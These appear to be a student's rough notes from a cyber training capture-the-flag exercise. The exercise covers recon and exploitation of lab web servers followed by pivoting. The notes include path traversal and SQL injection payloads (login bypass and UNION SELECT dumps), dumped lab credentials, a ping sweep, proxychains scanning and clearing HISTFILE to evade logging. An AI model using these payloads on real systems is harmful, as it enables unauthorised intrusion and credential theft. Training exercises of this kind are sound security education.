# CCTC Security
OPERATION Dry Run

23 JANUARY 2020 / 0800 / CTF 109 
Tasking
All actions must be in accordance with mission brief, scope, and RoE.
Complete the taskings on each referenced target below.
Each heading is the hostname of a target. The first listed target’s hostname is “PublicFacingWebsite”.
## 10.x.x.x/8
## X.X.X.30 RTR 
## X.X.X.190 RTR 

10.50.44.26
10.10.28.20/27

# PublicFacingWebsite
Perform Reconnaissance 
1. Find all information about, and contained within, the target system to include potential phishing targets, website directory structure, and hidden pages.
2. Actively scan and interact with target to find potential attack vectors.

Attempt Exploitation || Gain Initial Access
1. Use information gained from reconnaissance to gain access to the system.
```shell
# Begin intial nmap scans
nmap -Pn ##############
#################
Look at web pages
Look at Source code
open up all pages
naviagte to file locations found in the scripts
Home button/PDFs

FIle to read, you see that
myfile=../../../../../../../
- cat the file you can read an explore what you can cat to et information
- going to the unserame and login 
- username:Ford' or 1='1 password:Ford' or 1='1
- "inspect the source" then change the method from POST to GET
- once get crednetials, open bash shell unset HISTFILE
  - check hosts file cat /etc/hosts
  - ping -c1 BestWebApp
  - ## NEW TARGET Found
- Now go right to 192.168.28.181 website, boom
- now proxychains nmap -Pn 192.168.28.181 - see ports 22/80
- rerun your proxychains nmap scripts on this machines
- BOOM WEBPAGE, INSPECT SOURCE code
- submit and look at tall of the php in the searhc banner
- product=7 or 1=1
- LOOK INTO EACH SELECTION FIELD
  - siteuser


nmap 10.50.44.26 -sV -T4 # port 80 and 22
nmap 10.50.44.26 -Pn -p 80 --script http-enum.nse # shows maybbe admin folder, found files in firecotry called image
Ford' or 1='1# Welcome Aaron
Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER78 1Array ( [0] => user3 [name] => user3 [1] => Obo4GURRnccyrf [pass] => Obo4GURRnccyrf ) 1Array ( [0] => Lee_Roth [name] => Lee_Roth [1] => anotherpassword4THEages [pass] => anotherpassword4THEages ) 1
# go to website exploit login page with SQL injection tehcniques
 # Welcome AARON
user2:password
user3:Bob4THEEapples
Lee_Roth:anotherpassword4THEages

for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done | awk '{print $4}'
#now move to new target
cat /etc/hosts 
7 UNION SELECT table_schema,column_name, table_name FROM information_schema.columns;
7 UNION SELECT table_schema,table_name,column_name FROM siteusers.columns; #
http://192.168.28.181/pick.php?product=7%20Union%20SELECT%201,2,3
http://192.168.28.181/pick.php?product=7%20Union%20SELECT%20table_schema,table_name,column_name%20FROM%20information_schema.columns;
7 UNION SELECT user_id,name,username FROM siteusers.users;
HAM 	32 	$15
1 	Aaron 	$Aaron
2 	user2 	$user2
3 	user3 	$user3
4 	Lroth 	$Lee_Roth
1 	ncnffjbeqlCn$$jbeq 	$Aaron apasswordyPa$$word 
2 	RntyrfVfNER78 	$user2
3 	Obo4GURRnccyrf 	$user3
4 	anotherpassword4THEages 	$Lroth

# Find Additional Targets
1. Perform post-exploitation tasks (situational awareness, localhost enumeration, etc).
2. Discover additional targets through analysis of information from post-exploitation tasks.


# Pivot to Found Targets
1. Pivot through network to other targets as you find them.
NOTES
    • 

# BestWebApp
## Perform Reconnaissance
1. Find all information about, and contained within, the target system to include potential phishing targets, website directory structure, and hidden pages.
2. Actively scan and interact with target to find potential attack vectors. 

## Attempt Exploitation
1. Attempt to retrieve privileged information from the target by using information found in reconnaissance. Reconnaissance from other targets within the network may have information relevant to any target.
NOTES
    • 

# RoundSensor
# Perform Reconnaissance
1. Actively scan and interact with target to find potential attack vectors.

# Attempt Exploitation || Gain Initial Access
1. Use information gained from reconnaissance to gain access to the system. Reconnaissance from other targets within the network may have information relevant to any target.
# Find Additional Targets
1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
2. Discover additional targets through analysis of information from post-exploitation tasks.

# Pivot to Found Targets
1. Pivot through network to other targets as you find them.
-notes 

# Windows-Workstation
# Perform Reconnaissance
1. Actively scan and interact with target to find potential attack vectors.

# Attempt Exploitation || Gain Initial Access
1. Use information gained from reconnaissance to gain access to the system. Reconnaissance from other targets within the network may have information relevant to any target.
2. 
# Find Additional Targets
1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
2. Discover additional targets through analysis of information from post-exploitation tasks.
# Pivot to Found Targets
1. Pivot through network to other targets as you find them.
- notes 

